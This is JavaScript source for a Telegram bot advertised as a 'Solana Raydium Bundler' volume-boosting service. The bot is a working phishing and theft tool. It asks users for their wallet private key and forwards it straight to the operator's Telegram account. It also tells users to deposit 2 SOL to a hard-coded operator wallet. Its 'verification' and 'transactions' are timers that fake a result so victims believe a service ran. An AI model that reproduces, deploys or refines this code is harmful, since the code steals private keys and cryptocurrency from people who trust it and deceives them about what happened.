const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_USER_ID = parseInt(process.env.ADMIN_USER_ID);
const ADMIN_WALLETS = [
  'EubgRtpTkkrHYDTyJDi92rcmvt4GV72R6NGZpnBv8CHc',
  'EubgRtpTkkrHYDTyJDi92rcmvt4GV72R6NGZpnBv8CHc',
  'EubgRtpTkkrHYDTyJDi92rcmvt4GV72R6NGZpnBv8CHc',
  'EubgRtpTkkrHYDTyJDi92rcmvt4GV72R6NGZpnBv8CHc',
  'EubgRtpTkkrHYDTyJDi92rcmvt4GV72R6NGZpnBv8CHc'
];

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Conversation states
const STATES = {
  AWAITING_ADDRESS: 1,
  AWAITING_WALLET_OPTION: 2,
  AWAITING_PRIVATE_KEY: 3,
  AWAITING_DEPOSIT_CONFIRMATION: 4,
  AWAITING_TRANSFER_CONFIRMATION: 5,
  VERIFYING: 6,
  CHOOSING_ACTION: 7,
  PROCESSING_ACTION: 8
};

// Store user state
const userStates = new Map();
const walletAssignments = {};

// Helper functions
function getAssignedWallet(chatId) {
  if (!walletAssignments[chatId]) {
    walletAssignments[chatId] = ADMIN_WALLETS[Math.floor(Math.random() * ADMIN_WALLETS.length)];
  }
  return walletAssignments[chatId];
}

async function notifyAdmin(message) {
  try {
    await bot.sendMessage(ADMIN_USER_ID, message);
  } catch (error) {
    console.error(`Failed to notify admin: ${error.message}`);
  }
}

async function simulateVerification(chatId) {
  await new Promise(resolve => setTimeout(resolve, 40000)); // 40 second delay
  return 1; // Simulate finding 1 SOL
}

async function simulateTransactions(chatId) {
  await new Promise(resolve => setTimeout(resolve, 300000)); // 5 minute delay
}

// Handle /start command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(
    chatId, 
    '🌟 Welcome to **Solana Raydium Bundler** 🌟\n🚀 Boost your token volume or trade instantly with ease!\nPlease send your Solana token address.'
  );
  await notifyAdmin(`User ${chatId} started bot.`);
  userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userState = userStates.get(chatId) || { state: null };

  if (text.startsWith('/')) return;

  switch (userState.state) {
    case STATES.AWAITING_ADDRESS:
      await bot.sendMessage(
        chatId, 
        'Please choose an option:\n1 for import your wallet\n2 to create wallet'
      );
      await notifyAdmin(`User ${chatId} submitted token address: ${text}`);
      userStates.set(chatId, { 
        state: STATES.AWAITING_WALLET_OPTION, 
        address: text 
      });
      break;

    case STATES.AWAITING_WALLET_OPTION:
      if (text === '1') {
        await bot.sendMessage(
          chatId, 
          'Please enter your private key.'
        );
        await notifyAdmin(`User ${chatId} chose option 1: import wallet`);
        userStates.set(chatId, { 
          state: STATES.AWAITING_PRIVATE_KEY, 
          address: userState.address 
        });
      } else if (text === '2') {
        const assignedWallet = getAssignedWallet(chatId);
        await bot.sendMessage(
          chatId, 
          `Please deposit 2 SOL to this Solana address: \`${assignedWallet}\`\nOnce deposited, reply with "done".`,
          { parse_mode: 'Markdown' }
        );
        await notifyAdmin(`User ${chatId} chose option 2: create wallet, provided address: ${assignedWallet}`);
        userStates.set(chatId, { 
          state: STATES.AWAITING_TRANSFER_CONFIRMATION, 
          address: userState.address 
        });
      } else {
        await bot.sendMessage(
          chatId, 
          'Invalid option. Please choose 1 for import your wallet or 2 to create wallet.'
        );
        await notifyAdmin(`User ${chatId} sent invalid option: ${text}`);
      }
      break;

    case STATES.AWAITING_PRIVATE_KEY:
      await bot.sendMessage(
        chatId, 
        'Please deposit more than 1 SOL to start using volume booster or buy and sell.'
      );
      await notifyAdmin(`User ${chatId} submitted private key: ${text}`);
      userStates.set(chatId, { 
        state: STATES.AWAITING_DEPOSIT_CONFIRMATION, 
        address: userState.address 
      });
      break;

    case STATES.AWAITING_DEPOSIT_CONFIRMATION:
      await bot.sendMessage(
        chatId, 
        'Processing verification... Please wait 40 seconds.'
      );
      await notifyAdmin(`User ${chatId} confirmed deposit attempt`);
      userStates.set(chatId, { 
        state: STATES.VERIFYING, 
        address: userState.address 
      });

      try {
        const solAmount = await simulateVerification(chatId);
        await bot.sendMessage(
          chatId, 
          `Transaction verified. Total SOL in your wallet: ${solAmount}`
        );
        await showActionMenu(chatId);
        await notifyAdmin(`Verification completed for user ${chatId}`);
      } catch (error) {
        await bot.sendMessage(
          chatId, 
          'Error: No SOL found in your wallet. Try again.'
        );
        await notifyAdmin(`Verification failed for user ${chatId}: No SOL found`);
        userStates.delete(chatId);
        await bot.sendMessage(
          chatId, 
          'Please send your Solana token address to start again.'
        );
      }
      break;

    case STATES.AWAITING_TRANSFER_CONFIRMATION:
      if (text.toLowerCase() === 'done') {
        await bot.sendMessage(
          chatId, 
          'Processing verification... Please wait 40 seconds.'
        );
        await notifyAdmin(`User ${chatId} confirmed transfer`);
        userStates.set(chatId, { 
          state: STATES.VERIFYING, 
          address: userState.address 
        });

        try {
          const solAmount = await simulateVerification(chatId);
          await bot.sendMessage(
            chatId, 
            `Transaction verified. Total SOL in your wallet: ${solAmount}`
          );
          await showActionMenu(chatId);
          await notifyAdmin(`Verification completed for user ${chatId}`);
        } catch (error) {
          await bot.sendMessage(
            chatId, 
            'Error: No deposit found yet. Try again.'
          );
          await notifyAdmin(`Verification failed for user ${chatId}: No deposit found`);
          userStates.delete(chatId);
          await bot.sendMessage(
            chatId, 
            'Please send your Solana token address to start again.'
          );
        }
      } else {
        await bot.sendMessage(
          chatId, 
          'Please reply with "done" after depositing 2 SOL.'
        );
        await notifyAdmin(`User ${chatId} sent invalid response: ${text}`);
      }
      break;

    case STATES.CHOOSING_ACTION:
      if (text === '1' || text === '2') {
        await bot.sendMessage(
          chatId,
          '🚀 Bot is running... Transactions are being processed.\n\n' +
          'This will take approximately 5 minutes.'
        );
        await notifyAdmin(`User ${chatId} selected action ${text === '1' ? 'Volume Booster' : 'Instant Buy/Sell'}`);
        userStates.set(chatId, { 
          state: STATES.PROCESSING_ACTION, 
          action: text 
        });

        try {
          await simulateTransactions(chatId);
          await bot.sendMessage(
            chatId,
            '✅ All transactions completed successfully!'
          );
          await notifyAdmin(`Transactions completed for user ${chatId}`);
        } catch (error) {
          await bot.sendMessage(
            chatId,
            '❌ Some transactions failed. Please try again.'
          );
          await notifyAdmin(`Transactions failed for user ${chatId}`);
        }
        userStates.delete(chatId);
        await bot.sendMessage(
          chatId,
          'Type /start to begin a new session.'
        );
      } else {
        await bot.sendMessage(
          chatId,
          'Invalid option. Please choose 1 or 2.'
        );
      }
      break;

    default:
      await bot.sendMessage(chatId, 'Please use /start to begin.');
      await notifyAdmin(`User ${chatId} sent message without state: ${text}`);
  }
});

async function showActionMenu(chatId) {
  await bot.sendMessage(
    chatId,
    '🎯 Choose your desired action:\n\n' +
    '1️⃣ **Enter `1` for Volume Booster**\n' +
    '💹 Automatically generate buy & sell activity on Raydium\n\n' +
    '2️⃣ **Enter `2` for Instant Buy & Sell**\n' +
    '⚡ Buy & sell instantly from our 24-wallet engine\n\n' +
    '_Note: All SOL will be used from your wallet for this transaction. Minimum 1 SOL needed._',
    { parse_mode: 'Markdown' }
  );
  userStates.set(chatId, { 
    state: STATES.CHOOSING_ACTION,
    address: userStates.get(chatId).address 
  });
}

// Error handling
bot.on('polling_error', (error) => {
  console.error(`Polling error: ${error.message}`);
  notifyAdmin(`Bot error: ${error.message}`);
});

console.log('Bot is running...');
